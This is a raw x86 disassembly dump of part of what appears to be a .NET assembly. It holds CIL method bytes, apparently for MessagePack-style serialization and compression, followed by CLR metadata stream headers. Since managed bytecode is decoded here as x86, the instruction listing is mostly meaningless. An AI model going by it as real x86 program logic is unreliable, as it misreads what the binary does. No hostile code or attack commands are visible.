  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	34 27                	xor    $0x27,%al
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 5c 45 00          	add    %bl,0x0(%ebp,%eax,2)
  405a37:	00 34 28             	add    %dh,(%eax,%ebp,1)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 90 6d 00 00 10    	add    %dl,0x1000006d(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 a0 6d 00 00 40    	add    %ah,0x4000006d(%eax)
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	fa                   	cli
  405adb:	17                   	pop    %ss
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	06                   	push   %es
  405ae3:	00 9f 21 06 19 0a    	add    %bl,0xa190621(%edi)
  405ae9:	00 51 00             	add    %dl,0x0(%ecx)
  405aec:	57                   	push   %edi
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	cc                   	int3
  405af1:	21 ef                	and    %ebp,%edi
  405af3:	20 0a                	and    %cl,(%edx)
  405af5:	00 ba 18 70 26 06    	add    %bh,0x6267018(%edx)
  405afb:	00 9b 1d 3e 14 06    	add    %bl,0x6143e1d(%ebx)
  405b01:	00 14 11             	add    %dl,(%ecx,%edx,1)
  405b04:	57                   	push   %edi
  405b05:	1f                   	pop    %ds
  405b06:	0a 00                	or     (%eax),%al
  405b08:	9e                   	sahf
  405b09:	19 57 1f             	sbb    %edx,0x1f(%edi)
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	b8 20 70 26 06       	mov    $0x6267020,%eax
  405b13:	00 36                	add    %dh,(%esi)
  405b15:	22 06                	and    (%esi),%al
  405b17:	19 0e                	sbb    %ecx,(%esi)
  405b19:	00 19                	add    %bl,(%ecx)
  405b1b:	1b 7a 14             	sbb    0x14(%edx),%edi
  405b1e:	0e                   	push   %cs
  405b1f:	00 6d 21             	add    %ch,0x21(%ebp)
  405b22:	7a 14                	jp     0x405b38
  405b24:	06                   	push   %es
  405b25:	00 fe                	add    %bh,%dh
  405b27:	24 3e                	and    $0x3e,%al
  405b29:	14 06                	adc    $0x6,%al
  405b2b:	00 fa                	add    %bh,%dl
  405b2d:	1c af                	sbb    $0xaf,%al
  405b2f:	23 06                	and    (%esi),%eax
  405b31:	00 7c 19 06          	add    %bh,0x6(%ecx,%ebx,1)
  405b35:	19 0a                	sbb    %ecx,(%edx)
  405b37:	00 fa                	add    %bh,%dl
  405b39:	1f                   	pop    %ds
  405b3a:	30 00                	xor    %al,(%eax)
  405b3c:	06                   	push   %es
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	4c                   	dec    %esp
  405b41:	0b 12                	or     (%edx),%edx
  405b43:	00 19                	add    %bl,(%ecx)
  405b45:	00 ef                	add    %ch,%bh
  405b47:	1e                   	push   %ds
  405b48:	12 00                	adc    (%eax),%al
  405b4a:	01 00                	add    %eax,(%eax)
  405b4c:	06                   	push   %es
  405b4d:	19 12                	sbb    %edx,(%edx)
  405b4f:	00 4a 11             	add    %cl,0x11(%edx)
  405b52:	ef                   	out    %eax,(%dx)
  405b53:	1e                   	push   %ds
  405b54:	06                   	push   %es
  405b55:	00 b5 10 06 19 06    	add    %dh,0x6190610(%ebp)
  405b5b:	00 6d 14             	add    %ch,0x14(%ebp)
  405b5e:	af                   	scas   %es:(%edi),%eax
  405b5f:	23 06                	and    (%esi),%eax
  405b61:	00 f5                	add    %dh,%ch
  405b63:	1d 72 20 06 00       	sbb    $0x62072,%eax
  405b68:	e8 0e 72 20 06       	call   0x660cd7b
  405b6d:	00 e2                	add    %ah,%dl
  405b6f:	18 2a                	sbb    %ch,(%edx)
  405b71:	06                   	push   %es
  405b72:	06                   	push   %es
  405b73:	00 57 12             	add    %dl,0x12(%edi)
  405b76:	ef                   	out    %eax,(%dx)
  405b77:	1e                   	push   %ds
  405b78:	06                   	push   %es
  405b79:	00 c4                	add    %al,%ah
  405b7b:	12 ef                	adc    %bh,%ch
  405b7d:	1e                   	push   %ds
  405b7e:	06                   	push   %es
  405b7f:	00 74 11 9f          	add    %dh,-0x61(%ecx,%edx,1)
  405b83:	1e                   	push   %ds
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 0f                	add    %cl,(%edi)
  405b87:	1f                   	pop    %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 9c 11 3f 1a 06 00 	add    %bl,0x61a3f(%ecx,%edx,1)
  405b92:	23 12                	and    (%edx),%edx
  405b94:	3f                   	aas
  405b95:	1a 06                	sbb    (%esi),%al
  405b97:	00 04 12             	add    %al,(%edx,%edx,1)
  405b9a:	3f                   	aas
  405b9b:	1a 06                	sbb    (%esi),%al
  405b9d:	00 ab 12 3f 1a 06    	add    %ch,0x61a3f12(%ebx)
  405ba3:	00 77 12             	add    %dh,0x12(%edi)
  405ba6:	3f                   	aas
  405ba7:	1a 06                	sbb    (%esi),%al
  405ba9:	00 90 12 3f 1a 06    	add    %dl,0x61a3f12(%eax)
  405baf:	00 b3 11 3f 1a 06    	add    %dh,0x61a3f11(%ebx)
  405bb5:	00 e7                	add    %ah,%bh
  405bb7:	11 3f                	adc    %edi,(%edi)
  405bb9:	1a 06                	sbb    (%esi),%al
  405bbb:	00 ce                	add    %cl,%dh
  405bbd:	11 91 14 06 00 88    	adc    %edx,-0x77fff9ec(%ecx)
  405bc3:	11 d0                	adc    %edx,%eax
  405bc5:	1e                   	push   %ds
  405bc6:	06                   	push   %es
  405bc7:	00 59 11             	add    %bl,0x11(%ecx)
  405bca:	ef                   	out    %eax,(%dx)
  405bcb:	1e                   	push   %ds
  405bcc:	06                   	push   %es
  405bcd:	00 40 12             	add    %al,0x12(%eax)
  405bd0:	3f                   	aas
  405bd1:	1a 06                	sbb    (%esi),%al
  405bd3:	00 26                	add    %ah,(%esi)
  405bd5:	0c 3e                	or     $0x3e,%al
  405bd7:	14 06                	adc    $0x6,%al
  405bd9:	00 6f 23             	add    %ch,0x23(%edi)
  405bdc:	06                   	push   %es
  405bdd:	19 06                	sbb    %eax,(%esi)
  405bdf:	00 bd 22 06 19 06    	add    %bh,0x6190622(%ebp)
  405be5:	00 71 14             	add    %dh,0x14(%ecx)
  405be8:	af                   	scas   %es:(%edi),%eax
  405be9:	23 0a                	and    (%edx),%ecx
  405beb:	00 cc                	add    %cl,%ah
  405bed:	25 57 1f 06 00       	and    $0x61f57,%eax
  405bf2:	20 19                	and    %bl,(%ecx)
  405bf4:	f2 25 06 00 c8 1c    	repnz and $0x1cc80006,%eax
  405bfa:	f2 25 06 00 1f 14    	repnz and $0x141f0006,%eax
  405c00:	f2 25 06 00 c8 1a    	repnz and $0x1ac80006,%eax
  405c06:	06                   	push   %es
  405c07:	19 0a                	sbb    %ecx,(%edx)
  405c09:	00 e5                	add    %ah,%ch
  405c0b:	20 ba 21 0a 00 54    	and    %bh,0x54000a21(%edx)
  405c11:	22 ba 21 0a 00 a3    	and    -0x5cfff5df(%edx),%bh
  405c17:	17                   	pop    %ss
  405c18:	ba 21 0a 00 18       	mov    $0x18000a21,%edx
  405c1d:	26 ef                	es out %eax,(%dx)
  405c1f:	20 0a                	and    %cl,(%edx)
  405c21:	00 d4                	add    %dl,%ah
  405c23:	10 ef                	adc    %ch,%bh
  405c25:	20 0a                	and    %cl,(%edx)
  405c27:	00 bf 10 ef 20 06    	add    %bh,0x620ef10(%edi)
  405c2d:	00 00                	add    %al,(%eax)
  405c2f:	15 06 19 06 00       	adc    $0x61906,%eax
  405c34:	9d                   	popf
  405c35:	1c 06                	sbb    $0x6,%al
  405c37:	19 06                	sbb    %eax,(%esi)
  405c39:	00 64 19 06          	add    %ah,0x6(%ecx,%ebx,1)
  405c3d:	19 0a                	sbb    %ecx,(%edx)
  405c3f:	00 65 20             	add    %ah,0x20(%ebp)
  405c42:	ba 21 0a 00 1f       	mov    $0x1f000a21,%edx
  405c47:	20 ba 21 06 00 85    	and    %bh,-0x7afff9df(%edx)
  405c4d:	20 06                	and    %al,(%esi)
  405c4f:	19 06                	sbb    %eax,(%esi)
  405c51:	00 f4                	add    %dh,%ah
  405c53:	0e                   	push   %cs
  405c54:	06                   	push   %es
  405c55:	19 0a                	sbb    %ecx,(%edx)
  405c57:	00 ac 18 ef 20 0a 00 	add    %ch,0xa20ef(%eax,%ebx,1)
  405c5e:	ca 16 70             	lret   $0x7016
  405c61:	26 0a 00             	or     %es:(%eax),%al
  405c64:	24 23                	and    $0x23,%al
  405c66:	ba 21 0a 00 51       	mov    $0x51000a21,%edx
  405c6b:	1a 57 1f             	sbb    0x1f(%edi),%dl
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	43                   	inc    %ebx
  405c71:	20 20                	and    %ah,(%eax)
  405c73:	1a 06                	sbb    (%esi),%al
  405c75:	00 04 13             	add    %al,(%ebx,%edx,1)
  405c78:	06                   	push   %es
  405c79:	19 06                	sbb    %eax,(%esi)
  405c7b:	00 ee                	add    %ch,%dh
  405c7d:	16                   	push   %ss
  405c7e:	3e 14 06             	ds adc $0x6,%al
  405c81:	00 bc 16 06 19 0a 00 	add    %bh,0xa1906(%esi,%edx,1)
  405c88:	48                   	dec    %eax
  405c89:	16                   	push   %ss
  405c8a:	06                   	push   %es
  405c8b:	19 0a                	sbb    %ecx,(%edx)
  405c8d:	00 a1 10 06 19 06    	add    %ah,0x6190610(%ecx)
  405c93:	00 d3                	add    %dl,%bl
  405c95:	1d 06 19 06 00       	sbb    $0x61906,%eax
  405c9a:	56                   	push   %esi
  405c9b:	23 3e                	and    (%esi),%edi
  405c9d:	14 06                	adc    $0x6,%al
  405c9f:	00 dc                	add    %bl,%ah
  405ca1:	18 2a                	sbb    %ch,(%edx)
  405ca3:	06                   	push   %es
  405ca4:	06                   	push   %es
  405ca5:	00 60 1e             	add    %ah,0x1e(%eax)
  405ca8:	3e 14 0a             	ds adc $0xa,%al
  405cab:	00 9b 0e ef 20 06    	add    %bl,0x620ef0e(%ebx)
  405cb1:	00 93 01 06 19 06    	add    %dl,0x6190601(%ebx)
